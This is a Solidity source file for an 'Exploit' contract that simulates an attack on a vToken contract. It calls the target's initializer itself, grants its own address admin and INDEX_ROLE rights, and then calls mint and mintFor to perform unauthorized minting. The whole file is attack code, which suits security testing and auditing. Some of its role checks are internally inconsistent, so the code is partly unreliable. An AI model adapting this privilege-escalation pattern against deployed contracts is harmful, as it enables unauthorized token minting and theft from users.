// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "./vToken.sol"; 
import "@openzeppelin/contracts/access/AccessControl.sol";

/// @title Exploit Contract for vToken
/// @notice This contract is used to simulate an attack scenario on a vToken contract.
/// @dev Assumes vToken uses OpenZeppelin's AccessControl and has minting functions gated behind roles.
contract Exploit {
    vToken public vtoken;         // Target vToken contract
    address public alice;         // Deployer / attacker controller
    address public bob;           // Simulated external attacker address

    bytes32 public constant INDEX_ROLE = keccak256("INDEX_ROLE");

    address public asset;         // Token asset used for vToken initialization
    address public registry;      // Registry contract used for vToken initialization

    /// @notice Deploys the exploit contract and initializes the vToken contract.
    /// @param _vToken Address of the target vToken contract.
    /// @param _asset Address of the token asset used by vToken.
    /// @param _registry Address of the registry contract used by vToken.
    constructor(address _vToken, address _asset, address _registry) {
        vtoken = vToken(_vToken);
        alice = msg.sender;
        bob = address(0x123);     // Simulated malicious user
        asset = _asset;
        registry = _registry;

        vtoken.initialize(asset, registry);
    }

    /// @notice Grants the DEFAULT_ADMIN_ROLE of vToken to this Exploit contract.
    /// @dev Only callable by Alice (the deployer), and only if she currently holds admin rights.
    function grantAdminRoleToExploit() external {
        require(msg.sender == alice, "Only Alice can grant the admin role");

        bytes32 defaultAdminRole = AccessControl(address(vtoken)).DEFAULT_ADMIN_ROLE();
        require(AccessControl(address(vtoken)).hasRole(defaultAdminRole, msg.sender), "Not admin");

        AccessControl(address(vtoken)).grantRole(defaultAdminRole, address(this));
    }

    /// @notice Grants the INDEX_ROLE to this contract.
    /// @dev Simulates the first stage of privilege escalation.
    function stageOne() external {
        AccessControl(address(vtoken)).grantRole(INDEX_ROLE, address(this));
    }

    /// @notice Calls minting functions on vToken.
    /// @dev Assumes INDEX_ROLE is required to mint. This demonstrates unauthorized minting.
    function stageTwo() external {
        vtoken.mint();
        vtoken.mintFor(alice);
    }

    /// @notice Debug utility: checks if Bob has the INDEX_ROLE.
    /// @return True if Bob holds INDEX_ROLE, false otherwise.
    function checkBobRole() external view returns (bool) {
        return AccessControl(address(vtoken)).hasRole(INDEX_ROLE, bob);
    }

    /// @notice Debug utility: checks if msg.sender is an admin for the INDEX_ROLE.
    /// @return True if sender holds the admin role for INDEX_ROLE.
    function testAdmin() external view returns (bool) {
        bytes32 adminRole = AccessControl(address(vtoken)).getRoleAdmin(INDEX_ROLE);
        return AccessControl(address(vtoken)).hasRole(adminRole, msg.sender);
    }

    /// @notice Tries to grant INDEX_ROLE to this contract for testing.
    /// @dev Requires the sender to have the admin role for INDEX_ROLE.
    function tryGrant() external {
        bytes32 adminRole = AccessControl(address(vtoken)).getRoleAdmin(INDEX_ROLE);
        require(AccessControl(address(vtoken)).hasRole(adminRole, msg.sender), "Not admin");

        AccessControl(address(vtoken)).grantRole(INDEX_ROLE, address(this));
    }
}
